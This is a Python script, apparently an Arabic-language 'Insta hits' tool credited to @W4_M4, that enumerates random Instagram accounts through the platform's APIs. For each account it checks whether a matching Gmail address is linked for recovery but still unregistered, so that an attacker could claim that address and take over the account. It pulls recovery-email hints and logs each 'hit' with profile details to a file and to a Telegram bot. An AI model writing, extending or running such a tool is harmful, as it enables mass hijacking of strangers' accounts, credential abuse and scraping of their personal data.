import webbrowser
webbrowser.open('https://t.me/pytho2n')
import requests, os, sys, re, json, string, random, hashlib, uuid, time, webbrowser; from datetime import datetime; from threading import Thread, Timer; from requests import post as pp; from user_agent import generate_user_agent; from random import choice, randrange; from cfonts import render, say; from colorama import Fore, Style, init; from rich.console import Console; from rich.table import Table
init(autoreset=True)


#حقـوق اراس • @W4_M4
Z = '\x1b[1m\x1b[32m'
Y = '\x1b[1m\x1b[33m'
R = '\x1b[1m\x1b[31m'
W = '\x1b[1m\x1b[37m'
C = '\x1b[1m\x1b[36m'
X = '\x1b[0m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
BR = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m' 
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'#حقـوق اراس • @W4_M4
MJ4 = '\x1b[38;5;106m'
ma = '\x1b[38;5;26m'
c1 = '\x1b[38;5;120m'
j21 = '\x1b[38;5;204m'
p1 = '\x1b[38;5;150m'
cyan = "\033[1m\033[36m"
x = '\x1b[1;33m'#حقـوق اراس • @W4_M4
white = '\x1b[1;37m'
z = '\x1b[1;31m'
bi = random.randint(5,208)
ror1 = f'\x1b[38;5;{bi}m'
memo = random.randint(100, 300)
ror = f'\x1b[38;5;{memo}m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
BR = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
MJ4 = '\x1b[38;5;106m'
ma = '\x1b[38;5;26m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق#حقـوق اراس • @W4_M4
C = '\033[2;35m'  # وردي
S = '\033[2;36m'  # سمائي
G = '\033[1;34m'  # ازرق فاتح
HH = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابيض
Y = "\033[1;33m"  # Yellow
R = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر#حقـوق اراس • @W4_M4
F = '\033[2;31m'  # اخضر
C = "\033[1;97m"  # ابيض
B = '\033[2;36m'  # سمائي
E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
S = '\033[2;36m'#حقـوق اراس • @W4_M4
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"#حقـوق اراس • @W4_M4
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
a1 = '\x1b[1;31m'  # أح.مر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أز.رق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخض.ر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أ.صفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي
gg = '\x1b[38;5;208m'
X = '\033[1;33m'
J22 = '\x1b[38;5;209m'
J21 = '\x1b[38;5;204m'
J2 = '\x1b[38;5;203m'
J1 = '\x1b[38;5;202m'
E = '\033[1;31m'
W2 = '\x1b[38;5;120m'
W3 = '\x1b[38;5;204m'
W4 = '\x1b[38;5;150m'
W5 = '\x1b[1;33m'
W6 = '\x1b[1;31m'
W7 = "\033[1;33m"
W8 = '\x1b[2;36m'
W8 = f'\x1b[38;5;117m'
W9 = "\033[1m\033[34m"
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
A = '\x1b[2;39m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'#حقـوق اراس • @W4_M4
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\x1b[2;35m'
S = '\x1b[2;36m'
G = '\033[1;34m'
HH = '\033[1;34m'
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"#حقـوق اراس • @W4_M4
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
O = '\x1b[38;5;208m'
Y = '\033[1;34m'#حقـوق اراس • @W4_M4
C = '\033[2;35m'
M = '\x1b[1;37m'#حقـوق اراس • @W4_M4
pink_t5ok5 = '\x1b[38;5;199m'
WHITE_BOLD = '\x1b[1;97m'
reset = '\x1b[0m'
HH = random.choice([a1, a2, a3, a4, a5, a14, a18, a20, a21, a22, a23, a26, a27, a37, a38, a40 ,Y ,C,M,pink_t5ok5])

total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}


followers_stats = {
    '0-50': 0,
    '50-100': 0,
    '100-200': 0,
    '200-300': 0,
    '300-400': 0,
    '400-500': 0,
    '500-600': 0,
    '600-700': 0,
    '700-800': 0,
    '800-900': 0,
    '900-1000': 0
}


def aras():
    print(f"""                                 	
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝

            {a26}.•´¯`•.¸¸ {F} INSTA {a36}¸.•´¯`•.¸¸              
            
               {a31}TLE : @W4_M4 / @pytho2n 
                     
""")

aras()
TOKEN = input(f"{a4} Token :")
print()
ID = input(f"{a4} ID :")
webbrowser.open('https://t.me/pytho2n')
os.system('clear')


bbk = 10000
aras_id = 21254029834



def aras3(aras_followers):

    if aras_followers <= 50:
        return '0-50'
    elif aras_followers <= 100:
        return '50-100'
    elif aras_followers <= 200:
        return '100-200'
    elif aras_followers <= 300:
        return '200-300'
    elif aras_followers <= 400:
        return '300-400'
    elif aras_followers <= 500:
        return '400-500'
    elif aras_followers <= 600:
        return '500-600'
    elif aras_followers <= 700:
        return '600-700'
    elif aras_followers <= 800:
        return '700-800'
    elif aras_followers <= 900:
        return '800-900'
    else:
        return '900-1000'


def aras1():
    
    aras_ge = hits
    aras_bt = bad_insta + bad_email
    aras_be = good_ig
    os.system('clear')
    
    aras_stats = f"""
{HH}⟨ ⌁ ✶ ⌁ ✶ ⌁ ✶ ⌁✶ ⌁ ⟩
{a3}⬤ 𝗛𝗶𝘁𝘀      : {C}{aras_ge}
{Z}⬤ 𝐛𝐚𝐝 𝐈𝐧𝐬𝐭𝐚   : {C}{aras_bt}
{X}⬤ 𝐆𝐨𝐨𝐝 𝐈𝐧𝐬𝐭𝐚 : {C}{aras_be}
{HH}⟨ ⌁ ✶ ⌁ ✶ ⌁ ✶ ⌁✶ ⌁ ⟩
{a3}𝟢–𝟧𝟢       : {C}{followers_stats['0-50']}
{a3}𝟧𝟢–𝟣𝟢𝟢      : {C}{followers_stats['50-100']}
{a3}𝟣𝟢𝟢–𝟤𝟢𝟢     : {C}{followers_stats['100-200']}
{a3}𝟤𝟢𝟢–𝟥𝟢𝟢     : {C}{followers_stats['200-300']}
{a3}𝟥𝟢𝟢–𝟦𝟢𝟢     : {C}{followers_stats['300-400']}
{a3}𝟦𝟢𝟢–𝟧𝟢𝟢     : {C}{followers_stats['400-500']}
{a3}𝟧𝟢𝟢–𝟨𝟢𝟢     : {C}{followers_stats['500-600']}
{a3}𝟨𝟢𝟢–𝟩𝟢𝟢     : {C}{followers_stats['600-700']}
{a3}𝟩𝟢𝟢–𝟪𝟢𝟢     : {C}{followers_stats['700-800']}
{a3}𝟪𝟢𝟢–𝟫𝟢𝟢     : {C}{followers_stats['800-900']}
{a3}𝟫𝟢𝟢–𝟣𝟢𝟢𝟢    : {C}{followers_stats['900-1000']}
{HH}⟨ ⌁ ✶ ⌁ ✶ ⌁ ✶ ⌁✶ ⌁ ⟩
{J22}𝐁𝐲 ⋮ @W4_M4 ┃ 𝐀𝐑𝐀𝐒
{HH}⟨ ⌁ ✶ ⌁ ✶ ⌁ ✶ ⌁✶ ⌁ ⟩
    """
    print(aras_stats)

#حقـوق اراس • @W4_M4

def aras2():
    aras1()


def aras4():
    try:
        aras_alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        aras_n1 = ''.join(choice(aras_alphabet) for _ in range(randrange(6, 9)))
        aras_n2 = ''.join(choice(aras_alphabet) for _ in range(randrange(3, 9)))
        aras_host = ''.join(choice(aras_alphabet) for _ in range(randrange(15, 30)))
        
        aras_headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'User-Agent': str(generate_user_agent())
        }
        
        aras_url = "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
        aras_res1 = requests.get(aras_url, headers=aras_headers)
        aras_tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            aras_res1.text
        ).group(2)
        
        aras_cookies = {'__Host-GAPS': aras_host}
        aras_headers2 = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'User-Agent': generate_user_agent()
        }
        
        aras_data = {
            'f.req': f'["{aras_tok}","{aras_n1}","{aras_n2}","{aras_n1}","{aras_n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        
        aras_response = requests.post("https://accounts.google.com/_/signup/validatepersonaldetails",
                                 cookies=aras_cookies, headers=aras_headers2, data=aras_data)
        aras_token_line = str(aras_response.text).split('",null,"')[1].split('"')[0]
        aras_host = aras_response.cookies.get_dict()['__Host-GAPS']
        
        with open('tl.txt', 'w') as aras_f:
            aras_f.write(f"{aras_token_line}//{aras_host}\n")
    except Exception as aras_e:
        print(aras_e)
        aras4()


def aras5(aras_email):
    global bad_email, hits
    try:
        if '@' in aras_email:
            aras_email = aras_email.split('@')[0]
            
        with open('tl.txt', 'r') as aras_f:
            aras_token_data = aras_f.read().splitlines()[0]
        aras_tl, aras_host = aras_token_data.split('//')
        
        aras_cookies = {'__Host-GAPS': aras_host}
        aras_headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={aras_tl}",
            'User-Agent': generate_user_agent()
        }
        
        aras_params = {'TL': aras_tl}
        aras_data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{aras_tl}%22%2C%22{aras_email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        
        aras_response = pp("https://accounts.google.com/_/signup/usernameavailability",
                      params=aras_params, cookies=aras_cookies, headers=aras_headers, data=aras_data)
        
        if '"gf.uar",1' in aras_response.text:
            hits += 1
            aras2()
            aras_full_email = aras_email + '@gmail.com'
            aras_username, aras_domain = aras_full_email.split('@')
            aras8(aras_username, aras_domain)
        else:
            bad_email += 1
            aras2()
    except Exception:
        pass


def aras6(aras_email):
    global good_ig, bad_insta
    aras_ua = generate_user_agent()
    aras_dev = 'android-'
    aras_device_id = aras_dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    aras_uui = str(uuid.uuid4())
    
    aras_headers = {
        'User-Agent': aras_ua,
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    
    aras_data = {
        'signed_body': ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                        json.dumps({
                            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                            'adid': aras_uui,
                            'guid': aras_uui,
                            'device_id': aras_device_id,
                            'query': aras_email
                        })),
        'ig_sig_key_version': '4'
    }
    
    aras_response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', 
                             headers=aras_headers, data=aras_data).text
    
    if aras_email in aras_response:
        if '@gmail.com' in aras_email:
            aras5(aras_email)
        good_ig += 1
        aras2()
    else:
        bad_insta += 1
        aras2()


def aras7(aras_user):
    try:
        aras_headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        
        aras_data = {
            'signed_body': ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                            '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                            '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                            '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                            '"device_id":"android-b93ddb37e983481c",'
                            '"query":"' + aras_user + '"}'),
            'ig_sig_key_version': '4'
        }
        
        aras_response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', 
                                 headers=aras_headers, data=aras_data).json()
        aras_email_reset = aras_response.get('email', 'Reset None')
    except:
        aras_email_reset = 'Reset None'
    return aras_email_reset


def aras9(aras_hy):
    try:
        aras_ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019)
        ]
        
        for aras_upper, aras_year in aras_ranges:
            if aras_hy <= aras_upper:
                return aras_year
        return 2023
    except Exception:
        pass


def aras8(aras_username, aras_domain):
    global total_hits, followers_stats
    aras_account_info = infoinsta.get(aras_username, {})
    aras_user_id = aras_account_info.get('pk')
    aras_full_name = aras_account_info.get('full_name', 'Unknown')
    aras_followers = aras_account_info.get('follower_count', 0)
    aras_following = aras_account_info.get('following_count', '?')
    aras_posts = aras_account_info.get('media_count', '?')
    aras_bio = aras_account_info.get('biography', '—')
    aras_year = aras9(int(aras_user_id)) if aras_user_id else "Unknown"
    aras_account_age = datetime.now().year - int(aras_year) if str(aras_year).isdigit() else "?"
    aras_profile_link = f"https://instagram.com/{aras_username}"
    aras_is_private = aras_account_info.get('is_private', False)
    aras_is_business = aras_account_info.get('is_business', False)
    total_hits += 1
    
   
    aras_followers_range = aras3(aras_followers)
    followers_stats[aras_followers_range] += 1

    aras_info_text = f"""
═══════˛ 𝗜𝗡𝗦𝗧𝗔 .═══════
☀ Hits : {total_hits}  
☀ Gmail : {aras_username}@{aras_domain}  
☀ Reset : {aras7(aras_username)}  
☀ Username : {aras_username}  
☀ Followers : {aras_followers}  
☀ Following : {aras_following}  
☀ Posts : {aras_posts}  
☀ Date : {aras_year}
☀ Bio : {aras_bio}
☀ Profile : {aras_profile_link}  
☀ Private : {'Yes' if aras_is_private else 'No'}  
☀ Business : {'Yes' if aras_is_business else 'No'}
☀ Tle : @W4_M4
☀ Ch : https://t.me/pytho2n
═══════˛ 𝗜𝗡𝗦𝗧𝗔 .═══════
"""
    with open('hit • aras.txt', 'a') as aras_f:
        aras_f.write(aras_info_text + "\n")
    
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={aras_info_text}")
    except Exception:
        pass


def aras10():
    while True:
        aras_data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(bbk, aras_id)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        aras_headers = {'X-FB-LSD': aras_data['lsd']}
        
        try:
            aras_response = requests.post('https://www.instagram.com/api/graphql', headers=aras_headers, data=aras_data)
            aras_account = aras_response.json().get('data', {}).get('user', {})
            aras_username = aras_account.get('username')
            
            if aras_username:
                aras_followers = aras_account.get('follower_count', 0)
                if aras_followers < 10:
                    continue
                infoinsta[aras_username] = aras_account
                aras_emails = [aras_username + '@gmail.com']
                for aras_email in aras_emails:
                    aras6(aras_email)
        except Exception:
            pass


aras4()

for _ in range(100):
    Thread(target=aras10).start()
    
    
#حقـوق اراس • @W4_M4
